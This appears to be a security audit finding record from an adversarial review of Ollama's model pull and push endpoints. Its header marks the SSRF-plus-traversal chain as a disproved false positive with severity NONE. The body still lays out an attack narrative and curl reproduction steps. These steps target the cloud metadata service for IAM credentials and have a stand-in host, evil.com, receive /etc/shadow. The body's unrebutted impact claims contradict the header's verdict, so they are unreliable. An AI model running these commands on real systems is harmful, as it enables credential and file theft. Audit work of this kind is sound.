Phase: 8
Sequence: 012
Slug: ssrf-push-chain-full-egress
Verdict: FALSE POSITIVE (adversarial)
Rationale: Chain of Finding 002 (SSRF) + Finding 004 (push traversal read) yields zero-credential full egress — attacker obtains cloud IMDS tokens via SSRF and exfiltrates local files via push; both component findings are independently validated with no blocking mitigations found.
Severity-Original: CRITICAL
PoC-Status: theoretical
Pre-FP-Flag: none
Debate: archon/chamber-workspace/chamber-01/debate.md
Adversarial-Verdict: DISPROVED
Adversarial-Rationale: Both literal PoC names are rejected with HTTP 400 by parseNormalizePullModelRef -> Name.IsValid (host cannot contain '/', namespace cannot contain '.'), and even if bypassed the sha256-hex digest equality check in x/imagegen/transfer/download.go:257 blocks any manifest with a traversal digest from being persisted during pull, so the pull->push chain cannot fire.
Severity-Final: NONE
PoC-Status: executed

## Summary

Findings 002 (`/api/pull` SSRF) and 004 (`pushWithTransfer` traversal file read) compose into a zero-starting-credential end-to-end attack chain:

1. Attacker lures victim (or the victim's CI/automation) into `POST /api/pull {"name":"attacker.com/m:latest","insecure":true}`. Attacker's manifest contains a layer with `"digest":"sha256:../../../etc/shadow"` — stored verbatim on disk.
2. In parallel (or as Step 0), attacker hits `/api/pull {"name":"169.254.169.254/.../iam/security-credentials/<role>:x","insecure":true}` to exfiltrate IMDS creds via reflected error message — obtaining AWS/GCP credentials as the instance.
3. Victim (or automation) runs `POST /api/push {"name":"attacker.com/m:latest"}` — `/etc/shadow` is read and uploaded to attacker's registry.

Net result: with zero initial credentials and only `/api/pull` + `/api/push` endpoint reachability, the attacker obtains (a) cloud IAM credentials and (b) any file readable by the ollama user, all on a default ollama deployment.

## Location

Chain spans the locations from Findings 002 and 004. Key junction points:
- `server/images.go:615` (insecure gate)
- `server/images.go:864` (SSRF + body reflection into error)
- `server/images.go:787` (manifest stored verbatim)
- `server/images.go:796-851` (`pushWithTransfer`)
- `x/imagegen/transfer/upload.go:181` (traversal read sink)

## Attacker Control

Network attacker reachable to `/api/pull` and `/api/push`. Critical observation: both endpoints are **unauthenticated by default**. In cloud-hosted / container deployments (`OLLAMA_HOST=0.0.0.0`), the attacker can be anywhere that can TCP-connect. In default local installs, attacker needs local code execution OR DNS rebinding via a malicious webpage (subject to `allowedHostsMiddleware`).

## Trust Boundary Crossed

Network (internet / localhost) → cloud credentials + arbitrary file read with exfiltration to attacker's registry.

## Impact

- CRITICAL: unauthenticated remote attacker obtains cloud IAM credentials (via SSRF to IMDS) AND exfiltrates arbitrary local files (via push). On AWS EC2 instances running ollama with an attached instance role, this is immediate cloud account compromise. Chain also yields `/etc/passwd`, SSH keys, `.env`, etc.
- The chain's impact is strictly greater than either component because it requires no pre-existing credentials and no victim-side trust relationship beyond reaching the API.

## Evidence

Composed from Findings 002 and 004 (see those drafts for code). Key evidence of the chain's practicality:

- `pullModelManifest` stores manifest verbatim (no digest charset enforcement on layer digests during JSON decode in `manifest.Manifest` struct).
- `ParseNamedManifest` at `manifest/manifest.go:112` re-reads without validation.
- `pushWithTransfer` copies raw digest into `transfer.Blob` and `upload.go:181` opens it.
- SSRF error body is surfaced through `fmt.Errorf("pull model manifest: %s", err)` at `images.go:622`.

## Reproduction Steps

On AWS EC2 with ollama service:
```
# Step 1: exfiltrate IMDS
curl -X POST http://<victim>:11434/api/pull \
  -d '{"name":"169.254.169.254/latest/meta-data/iam/security-credentials/<role>:x","insecure":true}'
# Error response leaks IAM credentials JSON.

# Step 2: plant manifest with traversal digest
# (attacker registry at evil.com)
curl -X POST http://<victim>:11434/api/pull \
  -d '{"name":"evil.com/m:latest","insecure":true}'

# Step 3: trigger push
curl -X POST http://<victim>:11434/api/push \
  -d '{"name":"evil.com/m:latest","insecure":true}'
# /etc/shadow body appears in evil.com's registry upload logs.
```

Debate context: This chain is recorded as a distinct finding because its impact (CRITICAL, unauthenticated zero-cred full egress) materially exceeds the sum of its HIGH-severity parts. The component findings remain separately tracked for fix purposes (each has a distinct fix location). Advocate confirmed no chain-breaking mitigation exists.
